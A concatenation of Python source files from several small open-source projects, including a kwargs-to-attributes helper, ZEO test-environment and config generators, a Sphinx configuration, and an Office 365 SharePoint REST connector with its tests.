                u'mdocstring': u'Xex module docstring.',
                u'module_name': u'services.xex',
                u'method': u'GET'
            }
        ]
    }

    assert root in data
    assert static in data
    assert hist in data
    assert xex in data
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================,
"""
Xex module docstring.
"""
from bottle import route


# Functions & classes =========================================================
@route("/sources/xex")
def test2(something, something_else):
    """
    Another docstring
    """
    pass
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from hist import *
from xex import *
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
"""
Hist module level docstring.
"""
from bottle import route


# Functions & classes =========================================================
@route("/sources/hist")
def hist(something, something_else):
    """
    Here is hist docstring and so on.
    """
    pass


@route("/sources/hist/xe")
def hist_xe(something, something_else):
    """
    Here is hist/xe docstring and so on.
    """
    pass
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from kwargs_obj import KwargsObj
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================


# Functions & classes =========================================================
class KwargsObj(object):
    """
    This class defines method to map kwargs to attributes, so you can just
    call :meth:`_kwargs_to_attributes` in your ``__init__``.

    There is also modified :meth:`__setattr__`` method, which disables to set
    new attributes. This may be good for preventing typos for data containers.
    """
    def __setattr__(self, name, value):
        """
        Disable setting values which are not defined in ``.__init__()``.
        """
        if hasattr(self, "_all_set") and name not in self.__dict__:
            raise ValueError("%s is not defined in this class!" % name)

        self.__dict__[name] = value

    def _kwargs_to_attributes(self, kwargs):
        """
        Put keys from `kwargs` to `self`, if the keys are already there.
        """
        for key, val in kwargs.iteritems():
            if key not in self.__dict__:
                raise ValueError(
                    "Can't set %s parameter - it is not defined here!" % key
                )

            self.__dict__[key] = val
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from setuptools import setup, find_packages


# Variables ===================================================================
CHANGELOG = open('CHANGES.rst').read()
LONG_DESCRIPTION = "\n\n".join([
    open('README.rst').read(),
    CHANGELOG
])


# Functions ===================================================================
def allSame(s):
    return not any(filter(lambda x: x != s[0], s))


def hasDigit(s):
    return any(char.isdigit() for char in s)


def getVersion(data):
    """
    Parse version from changelog written in RST format.
    """
    data = data.splitlines()
    return next((
        v
        for v, u in zip(data, data[1:])  # v = version, u = underline
        if len(v) == len(u) and allSame(u) and hasDigit(v) and "." in v
    ))


# Actual setup definition =====================================================
setup(
    name='kwargs_obj',
    version=getVersion(CHANGELOG),
    description='Class that maps .__init__(self, **kwargs) to attributes.',
    long_description=LONG_DESCRIPTION,
    url='https://github.com/Bystroushaak/kwargs_obj',

    author='Bystroushaak',
    author_email='bystrousak@kitakitsune.org',

    classifiers=[
        'Intended Audience :: Developers',
        "Programming Language :: Python :: 2",
        'Programming Language :: Python :: 2.7',
        "License :: OSI Approved :: MIT License",
    ],
    license='MIT',

    packages=find_packages('src'),
    package_dir={'': 'src'},
    include_package_data=True,
    zip_safe=True,

    test_suite='py.test',
    tests_require=["pytest"],
    extras_require={
        "test": [
            "pytest"
        ],
    },
)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import pytest

from kwargs_obj import KwargsObj


# Classes =====================================================================
class KWTest(KwargsObj):
    def __init__(self, **kwargs):
        self.some_attr = None
        self.something = None

        self._kwargs_to_attributes(kwargs)


class DisableSettingAttributes(KwargsObj):
    def __init__(self):
        self.something = None

        self._all_set = True


# Tests =======================================================================
def test_blank_constructor():
    k = KWTest()

    assert k


def test_attribute_mapping():
    k = KWTest(
        some_attr=True
    )

    assert k.some_attr
    assert not k.something

    k.something = True
    assert k.something


def test_both_attributes():
    k = KWTest(
        some_attr=True,
        something=True
    )

    assert k.some_attr
    assert k.something


def test_invalid_attributes():
    with pytest.raises(ValueError):
        KWTest(azgabash=True)

    with pytest.raises(ValueError):
        KWTest(
            some_attr=True,
            azgabash=True
        )


def test_disable_setting():
    k = KWTest()

    # test setting nonexistent attribute
    k.azgabash = True
    assert hasattr(k, "azgabash")

    d = DisableSettingAttributes()

    with pytest.raises(ValueError):
        d.azgabash = True

    # you should be able to define existing attributes
    d.something = False
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import os.path

from environment_generator import tmp_context
from environment_generator import tmp_context_name

from environment_generator import generate_environment
from environment_generator import cleanup_environment


# Functions ===================================================================
def _in_path(fn, dirname="default_data"):
    pwd = os.path.dirname(__file__)
    return os.path.join(os.path.abspath(pwd), dirname, fn)


# Variables ===================================================================
SERVER_CONF_PATH = _in_path(fn="zeo.conf", dirname="default_data")
CLIENT_CONF_PATH = _in_path(fn="zeo_client.conf", dirname="default_data")

_SERVER_CONF_PATH = _in_path(fn="zeo.conf", dirname="template_data")
_CLIENT_CONF_PATH = _in_path(fn="zeo_client.conf", dirname="template_data")
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import shutil
import random
import os.path
import tempfile
import threading
import subprocess
from string import Template


# Variables ===================================================================
SERV = None  #: Here is stored the running process.
TMP_PATH = None  #: Here will be stored the path to the temporary directory.
ZEO_SERVER = "localhost"  #: Hostname for the ZEO server
ZEO_PORT = random.randint(20000, 65000)  #: Port for the ZEO server


# Functions & classes =========================================================
def data_context_name(fn):
    """
    Return the `fn` in absolute path in `template_data` directory.
    """
    return os.path.join(os.path.dirname(__file__), "template_data", fn)


def data_context(fn, mode="r"):
    """
    Return content fo the `fn` from the `template_data` directory.
    """
    with open(data_context_name(fn), mode) as f:
        return f.read()


def tmp_context_name(fn=None):
    """
    Return the `fn` in absolute path in temporary directory.
    """
    if not fn:
        return TMP_PATH

    return os.path.join(TMP_PATH, fn)


def tmp_context(fn, mode="r"):
    """
    Return content fo the `fn` from the temporary directory.
    """
    with open(tmp_context_name(fn), mode) as f:
        return f.read()


# Environment generators ======================================================
def generate_environment():
    """
    Generate the environment in ``/tmp`` and run the ZEO server process in
    another thread.
    """
    global TMP_PATH
    TMP_PATH = tempfile.mkdtemp()

    # write ZEO server config to  temp directory
    zeo_conf_path = os.path.join(TMP_PATH, "zeo.conf")
    with open(zeo_conf_path, "w") as f:
        f.write(
            Template(data_context("zeo.conf")).substitute(
                path=TMP_PATH,
                server=ZEO_SERVER,
                port=ZEO_PORT,
            )
        )

    # write client config to temp directory
    client_config_path = os.path.join(TMP_PATH, "zeo_client.conf")
    with open(client_config_path, "w") as f:
        f.write(
            Template(data_context("zeo_client.conf")).substitute(
                server=ZEO_SERVER,
                port=ZEO_PORT,
            )
        )

    # run the ZEO server
    def run_zeo():
        global SERV
        SERV = subprocess.Popen(["runzeo", "-C", zeo_conf_path])

    serv = threading.Thread(target=run_zeo)
    serv.setDaemon(True)
    serv.start()


def cleanup_environment():
    """
    Shutdown the ZEO server process running in another thread and cleanup the
    temporary directory.
    """
    SERV.terminate()
    shutil.rmtree(TMP_PATH)
    if os.path.exists(TMP_PATH):
        os.rmdir(TMP_PATH)

    global TMP_PATH
    TMP_PATH = None
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from setuptools import setup
from setuptools import find_packages


# Variables ===================================================================
changelog = open('CHANGELOG.rst').read()
long_description = "\n\n".join([
    open('README.rst').read(),
    changelog
])


# Functions ===================================================================
def allSame(s):
    return not any(filter(lambda x: x != s[0], s))


def hasDigit(s):
    return any(char.isdigit() for char in s)


def getVersion(data):
    """
    Parse version from changelog written in RST format.
    """
    data = data.splitlines()
    return next((
        v
        for v, u in zip(data, data[1:])  # v = version, u = underline
        if len(v) == len(u) and allSame(u) and hasDigit(v) and "." in v
    ))


# Actual setup definition =====================================================
setup(
    name='zeo_connector_defaults',
    version=getVersion(changelog),
    description="Default conf. files and conf. file generator for `zeo_connector`.",
    long_description=long_description,
    url='https://github.com/Bystroushaak/zeo_connector_defaults',

    author='Bystroushaak',
    author_email='bystrousak@kitakitsune.org',

    classifiers=[
        "Development Status :: 4 - Beta",
        'Intended Audience :: Developers',

        "Programming Language :: Python :: 2",
        "Programming Language :: Python :: 2.7",

        "License :: OSI Approved :: MIT License",
    ],
    license='MIT',

    packages=find_packages('src'),
    package_dir={'': 'src'},

    scripts=[
        'bin/zeo_connector_gen_defaults.py',
    ],

    zip_safe=False,
    include_package_data=True,
)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import sys
import os.path
import argparse
from string import Template

dirname = os.path.dirname(__file__)
imported_files = os.path.join(dirname, "../src/")
sys.path.insert(0, os.path.abspath(imported_files))

from zeo_connector_defaults import _SERVER_CONF_PATH
from zeo_connector_defaults import _CLIENT_CONF_PATH


# Functions & classes =========================================================
def create_configuration(args):
    with open(_SERVER_CONF_PATH) as f:
        server_template = f.read()

    with open(_CLIENT_CONF_PATH) as f:
        client_template = f.read()

    if not args.only_server:
        client = Template(client_template).substitute(
            server=args.server,
            port=args.port,
        )
        with open(os.path.basename(_CLIENT_CONF_PATH), "w") as f:
            f.write(client)

    if not args.only_client:
        server = Template(server_template).substitute(
            server=args.server,
            port=args.port,
            path=args.path,
        )
        with open(os.path.basename(_SERVER_CONF_PATH), "w") as f:
            f.write(server)


# Main program ================================================================
if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="""This program will create the default ZEO XML
            configuration files."""
    )
    parser.add_argument(
        "-s",
        "--server",
        default="localhost",
        help="Server url. Default: localhost"
    )
    parser.add_argument(
        "-p",
        "--port",
        default=60985,
        type=int,
        help="Port of the server. Default: 60985"
    )
    parser.add_argument(
        "path",
        metavar="PATH",
        nargs='?',
        default="",
        help="""Path to the database on the server (used in server
            configuration only."""
    )
    parser.add_argument(
        "-C",
        "--only-client",
        action="store_true",
        help="Create only CLIENT configuration."
    )
    parser.add_argument(
        "-S",
        "--only-server",
        action="store_true",
        help="Create only SERVER configuration."
    )

    args = parser.parse_args()

    if not args.only_client and not args.path:
        sys.stderr.write(
            "You have to specify path to the database on for the DB server.\n"
        )
        sys.exit(1)

    if args.only_client and args.only_server:
        sys.stderr.write(
            "You can't have --only-client and --only-server together!\n"
        )
        sys.exit(1)

    create_configuration(args)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================


# Functions & classes =========================================================
def cached(fn):
    """
    Cache decorator. This decorator simply uses ``*args`` as lookup key for
    cache dict.

    If you are using python3, use functools.lru_cache() instead.
    """
    cache = {}

    def cached_decorator(*args, **kwargs):
        if args in cache:
            return cache[args]

        val = fn(*args, **kwargs)
        cache[args] = val

        return val

    return cached_decorator
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from urlparse import urljoin


# Functions & classes =========================================================
def to_absolute_url(link, base_url):
    if link.startswith("http://") or link.startswith("https://"):
        return link

    return urljoin(base_url, link)


def links_to_absolute_url(links, base_url):
    return [
        to_absolute_url(link, base_url)
        for link in links
    ]
#! /usr/bin/env python3


def get_version(data):
    def all_same(s):
        return all(x == s[0] for x in s)

    def has_digit(s):
        return any(x.isdigit() for x in s)

    data = data.splitlines()
    return list(
        line for line, underline in zip(data, data[1:])
        if (len(line) == len(underline) and
            all_same(underline) and
            has_digit(line) and
            "." in line)
    )[0]
# -*- coding: utf-8 -*-
#
import os
import sys
import urllib
import os.path

sys.path.insert(0, os.path.abspath('..'))

extensions = [
    'sphinx.ext.autodoc',
    'sphinx.ext.todo',
    'sphinx.ext.coverage',
    'sphinx.ext.viewcode',
    'sphinxcontrib.napoleon'
]

# Napoleon settings
napoleon_google_docstring = True
napoleon_numpy_docstring = False
napoleon_include_private_with_doc = False
napoleon_include_special_with_doc = True

# Document all methods in classes
autoclass_content = 'both'

# Sorting of items
autodoc_member_order = "bysource"

# Add any paths that contain templates here, relative to this directory.
templates_path = ['_templates']

# The suffix of source filenames.
source_suffix = '.rst'

# The master toctree document.
master_doc = 'index'

# General information about the project.
project = u'o365_sharepoint_connector'
copyright = u'Bystroushaak'

# The full version, including alpha/beta/rc tags.
try:
    # read data from CHANGES.rst
    sys.path.insert(0, os.path.abspath('../'))
    from docs import get_version
    release = get_version(open("../CHANGES.rst").read())
except:
    # this is here specially for readthedocs, which downloads only docs, not
    # other files
    fh = urllib.urlopen("https://pypi.python.org/pypi/" + project + "/")
    release = filter(lambda x: "<title>" in x, fh.read().splitlines())
    release = release[0].split(":")[0].split()[1]

# The short X.Y version.
version = ".".join(release.split(".")[:2])

# List of patterns, relative to source directory, that match files and
# directories to ignore when looking for source files.
exclude_patterns = ['_build']

# The name of the Pygments (syntax highlighting) style to use.
pygments_style = 'sphinx'

# The theme to use for HTML and HTML Help pages.  See the documentation for
# a list of builtin themes.
html_theme = 'default'

# Add any paths that contain custom static files (such as style sheets) here,
# relative to this directory. They are copied after the builtin static files,
# so a file named "default.css" will overwrite the builtin "default.css".
html_static_path = ['_static']

# If true, links to the reST sources are added to the pages.
html_show_sourcelink = True

# Output file base name for HTML help builder.
htmlhelp_basename = 'o365_sharepoint_connector'
from .o365_sharepoint_connector import *
#! /usr/bin/env python3


#! /usr/bin/env python3
import os.path
import unittest

from o365_sharepoint_connector import SharePointConnector
from o365_sharepoint_connector import CantCreateNewListException


class TestSharePointConnector(unittest.TestCase):
    TEST_DIR = os.path.dirname(os.path.abspath(__file__))
    LOGIN_FILE = os.path.join(TEST_DIR, "login.txt")
    USERNAME, PASSWORD, SITE_URL = open(LOGIN_FILE).read().splitlines()

    @classmethod
    def setUpClass(cls):
        cls.c = SharePointConnector(
            login=cls.USERNAME,
            password=cls.PASSWORD,
            site_url=cls.SITE_URL
        )
        cls.c.authenticate()

    def test_add_list_dir_list_remove_list(self):
        try:
            new_list = self.c.add_list("unittests")
            self.assertEqual(new_list.title, "unittests")
        except CantCreateNewListException:
            pass

        lists = self.c.get_lists()
        self.assertIn("unittests", lists)

        lists = self.c.get_lists()
        lists["unittests"].delete()

        lists = self.c.get_lists()
        self.assertNotIn("unittests", lists)

    def test_get_all_folders(self):
        try:
            ut_list = self.c.add_list("unittests")
        except CantCreateNewListException:
            ut_list = self.c.get_lists()["unittests"]

        assert ut_list.get_all_folders()


if __name__ == '__main__':
    unittest.main()
import os
import os.path
import json
import logging
from urllib.parse import urlparse
from urllib.parse import urlunparse

import requests
from lxml import etree


logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)
headers = {
    "GET": {
        "Accept": "application/json;odata=verbose"
    },
    "POST": {
        "Accept": "application/json;odata=verbose",
        'X-RequestDigest': "",
        'Content-Type': "application/json;odata=verbose",
    },
    "PUT": {
        "Accept": "application/json;odata=verbose",
        "X-RequestDigest": '',
        "Content-Type": "application/json;odata=verbose",
        "X-HTTP-Method": "PATCH",
        "If-Match": "*",
    },
    "DELETE": {
        "Accept": "application/json;odata=verbose",
        "Content-Type": "application/json;odata=verbose",
        "X-RequestDigest": "",
        "X-HTTP-Method": "DELETE",
        "If-Match": "*"
    },
}


class SharepointException(Exception):
    pass


class LoginException(SharepointException):
    pass


class CantCreateNewListException(SharepointException):
    pass


class CantCreateNewListItemException(SharepointException):
    pass


class CantCreateNewFieldException(SharepointException):
    pass

class CantCreateNewFolderException(SharepointException):
    pass


class CantChangeFieldIndexException(SharepointException):
    pass


class ListingException(SharepointException):
    pass


class UpdateException(SharepointException):
    pass


class DeleteException(SharepointException):
    pass


class UploadException(SharepointException):
    pass


class CheckInException(SharepointException):
    pass


class CheckOutException(SharepointException):
    pass


class _SharepointElementBase:
    """
    Common parts of the Sharepoint elements factored out into shared base class.
    """

    def __init__(self):
        self._connector = None

    def _compose_url(self, relative_url, *args):
        """
        Compose SharepointConnector.base_url, relative url and arguments
        into one string.

        Args:
            relative_url (str): Relative URL without /. For example `_api/web/GetByTitle('/{}')`.
            *args (list): List of arguments for formatting function.

        Returns:
            str: Expanded absolute URL.
        """
        return self._connector._compose_url(relative_url, *args)

    def _parse_exception(self, keywords):
        """
        Read `exception` parameter from `keywords` and remove it.

        Args:
            keywords (dict): **kwargs parameters for other functions.

        Returns:
            tuple: (exception, updated_keywords)
        """

        exception = None
        if "exception" in keywords:
            exception = keywords["exception"]
            del keywords["exception"]

        return exception, keywords

    def _send_get_request(self, url, *url_params, **keywords):
        """
        Send GET request.

        Args:
            url (str): Relative URL with formatting strings and without slash at the beginning.
            *url_params (list): Variable number of parameters for formatting strings.
            **keywords (dict): Variable number of parameters for requests library.

        Raises:
            exception: Exception defined in `exception` key in `keywords` if the status_code is not
                       in SharepointConnector.success_list.

        Returns:
            obj: Requests response object.
        """
        url = self._compose_url(url, *url_params)
        logger.debug("URL: %s", url)

        exception, keywords = self._parse_exception(keywords)

        result = self._connector.session.get(url, **keywords)
        logger.debug("GET: %s", result.status_code)

        if exception and result.status_code not in self._connector.success_list:
                raise exception(result.content)

        return result

    def _send_post_request(self, url, *url_params, **keywords):
        """
        Send POST request.

        Args:
            url (str): Relative URL with formatting strings and without slash at the beginning.
            *url_params (list): Variable number of parameters for formatting strings.
            **keywords (dict): Variable number of parameters for requests library.

        Raises:
            exception: Exception defined in `exception` key in `keywords` if the status_code is not
                       in SharepointConnector.success_list.

        Returns:
            obj: Requests response object.
        """
        url = self._compose_url(url, *url_params)
        logger.debug("URL: %s", url)

        exception, keywords = self._parse_exception(keywords)

        result = self._connector.session.post(url, **keywords)
        logger.debug("POST: %s", result.status_code)

        if exception and result.status_code not in self._connector.success_list:
                raise exception(result.content)

        return result

    def _send_delete_request(self, url, *url_params, **keywords):
        """
        Send DELETE request.

        Args:
            url (str): Relative URL with formatting strings and without slash at the beginning.
            *url_params (list): Variable number of parameters for formatting strings.
            **keywords (dict): Variable number of parameters for requests library.

        Raises:
            exception: Exception defined in `exception` key in `keywords` if the status_code is not
                       in SharepointConnector.success_list.

        Returns:
            obj: Requests response object.
        """
        url = self._compose_url(url, *url_params)
        logger.debug("URL: %s", url)

        exception, keywords = self._parse_exception(keywords)

        result = self._connector.session.delete(url, **keywords)
        logger.debug("DELETE: %s", result.status_code)

        if exception and result.status_code not in self._connector.success_list:
                raise exception(result.content)

        return result


class SharepointFile(_SharepointElementBase):
    """
    Wrapper for file in the SharepointFolder.
    """
    def __init__(self):
        self.raw_data = None
        self._connector = None

        self.name = ""
        self.uuid = ""
        self.exists = True
        self.content_tag = ""
        self.linking_url = ""
        self.time_created = ""
        self.check_out_type = ""
        self.check_in_comment = ""
        self.time_last_modified = ""
        self.server_relative_url = ""
        self.folder_relative_url = ""

    @classmethod
    def from_dict(cls, connector, folder_relative_url, data):
        sfile = cls()
        sfile.raw_data = data
        sfile._connector = connector
        sfile.folder_relative_url = folder_relative_url

        sfile.name = data["Name"]
        sfile.uuid = data["UniqueId"]
        sfile.exists = data["Exists"]
        sfile.content_tag = data["ContentTag"]
        sfile.linking_url = data["LinkingUrl"]
        sfile.time_created = data["TimeCreated"]
        sfile.check_out_type = data["CheckOutType"]
        sfile.check_in_comment = data["CheckInComment"]
        sfile.time_last_modified = data["TimeLastModified"]
        sfile.server_relative_url = data["ServerRelativeUrl"]

        return sfile

    def __repr__(self):
        return "SharepointFile(%s)" % self.server_relative_url

    def check_in(self, comment="", check_in_type=0):
        """
        Check in the file.

        Args:
            comment (str): Optional comment for the check in. Default empty.
            check_in_type (int): Optional type of check in. Defautl 0.

        Raises:
            CheckInException
        """
        logger.info(
            "CheckIn file '%s' in library '%s' with comment '%s'.",
            os.path.basename(self.name),
            self.server_relative_url,
            comment
        )

        headers["POST"]["X-RequestDigest"] = self._connector.digest()
        self._send_post_request(
            "_api/web/GetFileByServerRelativeUrl('/{}/{}')/CheckIn(comment='{}',checkintype={})",
            self.folder_relative_url,
            self.name,
            comment,
            check_in_type,
            headers=headers["POST"],
            exception=CheckInException
        )

    def check_out(self):
        """
        Check out the file.

        Raises:
            CheckOutException
        """
        logger.info("CheckOut file '%s' in library '%s'.", os.path.basename(self.name), self.folder_relative_url)

        headers["POST"]["X-RequestDigest"] = self._connector.digest()
        self._send_post_request(
            "_api/web/GetFileByServerRelativeUrl('/{}/{}')/CheckOut()",
            self.folder_relative_url,
            self.name,
            headers=headers["POST"],
            exception=CheckOutException
        )

    def get_content(self):
        """
        Get content of the file from folder/library as binary data.

        Raises:
            ListingException

        Returns:
            bytes: Content of the file.
        """
        logger.info("Get %s from %s.", self.name, self.server_relative_url)

        get = self._send_get_request(
            "_api/web/GetFolderByServerRelativeUrl('{}')/Files('{}')/$value",
            self.folder_relative_url,
            self.name,
            headers=headers["GET"],
            exception=ListingException
        )

        return get.content

    def delete(self):
        """
        Delete this file.

        Raises:
            DeleteException
        """
        logger.info("Delete file '%s' from library '%s'.", os.path.basename(self.name), self.folder_relative_url)

        headers["DELETE"]["X-RequestDigest"] = self._connector.digest()
        self._send_delete_request(
            "_api/web/GetFileByServerRelativeUrl('/{}/{}')",
            self.folder_relative_url,
            self.name,
            headers=headers["DELETE"],
            exception=DeleteException
        )

        self.exists = False

    def update(self, local_file_path):
        """
        Update content of the file.

        Args:
            local_file_path (str): Path to the local data.

        Raises:
            UploadException
        """
        logger.info("Update file '%s' with data '%s'.", self.server_relative_url, local_file_path)

        headers["POST"]["X-RequestDigest"] = self._connector.digest()

        with open(local_file_path, "rb") as f:
            file_as_bytes = bytearray(f.read())

        self._send_post_request(
            "_api/web/GetFolderByServerRelativeUrl('/{}')/Files/add(url='{}',overwrite=true)",
            self.folder_relative_url,
            self.name or os.path.basename(local_file_path),
            data=file_as_bytes,
            headers=headers["POST"],
            exception=UploadException
        )


class SharepointFolder(_SharepointElementBase):
    """
    Representation of the sharepoint folder.
    """

    def __init__(self):
        self.raw_data = None
        self._connector = None

        self.name = ""
        self.exists = True
        self.unique_id = ""
        self.item_count = 0
        self.time_created = ""
        self.time_last_modified = ""
        self.server_relative_url = ""

    @classmethod
    def from_dict(cls, connector, data):
        sdir = cls()
        sdir.raw_data = data
        sdir._connector = connector

        sdir.name = data["Name"]
        sdir.exists = data["Exists"]
        sdir.unique_id = data["UniqueId"]
        sdir.item_count = data["ItemCount"]
        sdir.time_created = data["TimeCreated"]
        sdir.time_last_modified = data["TimeLastModified"]
        sdir.server_relative_url = data["ServerRelativeUrl"]

        return sdir

    def __repr__(self):
        return "SharepointDir(%s)" % self.server_relative_url

    def get_files(self):
        """
        Gets all :class:`SharepointFile` in this folder.

        Raises:
            ListingException

        Returns:
            dict: {name: SharepointFile}
        """
        logger.info("Get all files from %s.", self.server_relative_url)

        get = self._send_get_request(
            "_api/web/GetFolderByServerRelativeUrl('/{}')/Files",
            self.server_relative_url,
            headers=headers["GET"],
            exception=ListingException
        )

        return {
            x["Name"]: SharepointFile.from_dict(self._connector, self.server_relative_url, x)
            for x in get.json()["d"]["results"]
        }

    def upload_file(self, local_file_path, filename=None):
        """
        Upload a file into this directory. If file already exists, it is
        overwritten.

        Args:
            local_file_path (str): Path to the local file.
            filename (str, default None): Optional name of the remote file.
                If not given, name is taken from the local `local_file_path`.

        Returns:
            obj: SharepointFile - uploaded file.
        """
        filename = filename or os.path.basename(local_file_path)
        logger.info("Upload file '%s' to folder '%s' as '%s'.", local_file_path, self.server_relative_url, filename)

        headers["POST"]["X-RequestDigest"] = self._connector.digest()

        with open(local_file_path, "rb") as f:
            file_as_bytes = bytearray(f.read())

        post = self._send_post_request(
            "_api/web/GetFolderByServerRelativeUrl('/{}')/Files/add(url='{}',overwrite=true)",
            self.server_relative_url,
            filename,
            data=file_as_bytes,
            headers=headers["POST"],
            exception=UploadException
        )

        return SharepointFile.from_dict(
            self._connector,
            self.server_relative_url,
            post.json()["d"]
        )

    def delete(self):
        """
        Deletes this folder.

        Raises:
            DeleteException
        """
        logger.info("Delete folder %s.", self.server_relative_url)

        headers["DELETE"]["X-RequestDigest"] = self._connector.digest()
        self._send_delete_request(
            "_api/web/GetFolderByServerRelativeUrl('{}')",
            self.server_relative_url,
            headers=headers["DELETE"],
            exception=DeleteException
        )

    def add_subfolder(self, name):
        """
        Create new subfolder under this folder.

        Raise:
            CantCreateNewFolderException

        Returns:
            SharepointFolder: Newly created folder.
        """
        relative_url = self.server_relative_url.replace("/Forms/AllItems.aspx", "/")
        relative_url = relative_url + "/" if not relative_url.endswith("/") else relative_url

        data = {
            '__metadata': {'type': 'SP.Folder'},
            'ServerRelativeUrl': '{}{}'.format(relative_url, name)
        }
        logger.info("Create folder %s.", data)

        headers["POST"]["X-RequestDigest"] = self._connector.digest()
        get = self._send_post_request(
            "_api/web/folders",
            headers=headers["POST"],
            data=json.dumps(data),
            exception=CantCreateNewFolderException
        )

        return SharepointFolder.from_dict(self._connector, get.json()["d"])


class SharepointView(_SharepointElementBase):
    """
    Represent View into the list.
    """
    def __init__(self):
        self.id = ""
        self.title = ""
        self.paged = False
        self.hidden = False
        self.list_id = None
        self.read_only = False
        self.server_relative_url = ""

        self.raw_data = None
        self._connector = None

    @classmethod
    def from_dict(cls, connector, list_id, data):
        view = cls()
        view.list_id = list_id
        view.raw_data = data
        view._connector = connector

        view.id = data["Id"]
        view.paged = data["Paged"]
        view.title = data["Title"]
        view.hidden = data["Hidden"]
        view.read_only = data["ReadOnlyView"]
        view.server_relative_url = data["ServerRelativeUrl"]

        return view

    def __repr__(self):
        return "SharepointView(%s)" % self.title

    def add_field(self, field_name):
        """
        Adds a specific field to this view.

        Args:
            field_name (str): Name of the field.

        Raises:
            CantCreateNewFieldException
        """
        logging.info("Add %s field to the view.", field_name)

        headers["POST"]["X-RequestDigest"] = self._connector.digest()
        self._send_post_request(
            "_api/web/lists(guid'{}')/views(guid'{}')/viewfields/addviewfield('{}')",
            self.list_id,
            self.id,
            field_name,
            headers=headers["POST"],
            exception=CantCreateNewFieldException
        )

    def change_field_index(self, field_name, field_index):
        """
        Change index of `field_name` to `field_index`.

        Args:
            field_name (str): Field name to be changed.
            field_index (int): New index.

        Raises:
            CantChangeFieldIndexException
        """
        logger.info("Moved %s field to the index %s.", field_name, field_index)

        headers["POST"]["X-RequestDigest"] = self._connector.digest()
        self._send_post_request(
            "_api/web/lists(guid'{}')/views(guid'{}')/viewfields/moveviewfieldto",
            self.list_id,
            self.id,
            headers=headers["POST"],
            data=json.dumps({"field": field_name, "index": field_index}),
            exception=CantChangeFieldIndexException
        )

    def remove_field(self, field_name):
        """
        Removes a specific field from this view.

        Args:
            field_name (str): Name of the field to be removed.

        Raises:
            DelteException
        """
        logger.info("Remove %s field to the view.", field_name)

        headers["DELETE"]["X-RequestDigest"] = self._connector.digest()
        self._send_post_request(
            "_api/web/lists(guid'{}')/views(guid'{}')/viewfields/removeviewfield('{}')",
            self.list_id,
            self.id,
            field_name,
            headers=headers["DELETE"],
            exception=DeleteException
        )

    def remove_all_fields(self):
        """
        Removes all fields from this view.

        Raises:
            DeleteException
        """
        logger.info("Remove all fields from the view.")

        headers["DELETE"]["X-RequestDigest"] = self._connector.digest()
        self._send_post_request(
            "_api/web/lists(guid'{}')/views(guid'{}')/viewfields/removeallviewfields",
            self.list_id,
            self.id,
            headers=headers["DELETE"],
            exception=DeleteException
        )

    def add_folder(self, name):
        """
        Create new folder in this view.

        Raise:
            CantCreateNewFolderException

        Returns:
            SharepointFolder: Newly created folder.
        """
        relative_url = self.server_relative_url.replace("/Forms/AllItems.aspx", "/")

        data = {
            '__metadata': {'type': 'SP.Folder'},
            'ServerRelativeUrl': '{}{}'.format(relative_url, name)
        }
        logger.info("Create folder %s.", data)

        headers["POST"]["X-RequestDigest"] = self._connector.digest()
        get = self._send_post_request(
            "_api/web/folders",
            headers=headers["POST"],
            data=json.dumps(data),
            exception=CantCreateNewFolderException
        )

        return SharepointFolder.from_dict(self._connector, get.json()["d"])

    def get_folders(self):
        """
        Get all folders in this view.

        Raise:
            ListingException

        Returns:
            dict: {name: SharepointFolder}
        """
        relative_url = self.server_relative_url.replace("/Forms/AllItems.aspx", "/")
        logger.info("Get list of folders for %s.", relative_url)

        get = self._send_get_request(
            "_api/web/GetFolderByServerRelativeUrl('{}')/Folders",
            relative_url,
            headers=headers["GET"],
            exception=ListingException
        )

        return {
            x["Name"]: SharepointFolder.from_dict(self._connector, x)
            for x in get.json()["d"]["results"]
        }


class SharepointListItemAttachment(_SharepointElementBase):
    """
    Representation of the Attachment for the SharepointList.
    """
    def __init__(self):
        self.raw_data = {}
        self._connector = None

        self.id = ""
        self.title = ""

    @classmethod
    def from_dict(cls, connector, list_title, data):
        item = cls()
        item.raw_data = data
        item._connector = connector
        item.list_title = list_title

        item.id = data["Id"]
        item.title = data["Title"]

        return item

    def __repr__(self):
        return "SharepointListItemAttachment(id=%s)" % self.id

    def update_attachment(self, local_file_path):
        """
        Upload new value for this attachment.

        Args:
            local_file_path (str): Path to the local resource to be uploaded.

        Raises:
            UpdateException
        """
        logger.info(
            "Update file '%s' for list item '%s' in %s.",
            os.path.basename(local_file_path),
            self.id,
            self.title
        )

        headers["PUT"]["X-RequestDigest"] = self._connector.digest()
        with open(local_file_path, "rb") as f:
            file_to_bites = bytearray(f.read())

        self._send_post_request(
            "_api/web/lists/GetByTitle('{}')/items({})/AttachmentFiles('{}')/$value",
            self.title,
            self.id,
            os.path.basename(local_file_path),
            headers=headers["POST"],
            data=file_to_bites,
            exception=UpdateException
        )


class SharepointListItem(_SharepointElementBase):
    """
    Representation of the item in list.
    """
    def __init__(self):
        self.raw_data = {}
        self._connector = None
        self.list_title = ""

        self.id = None
        self.guid = ""
        self.title = ""
        self.created = ""
        self.modified = ""
        self.author_id = None
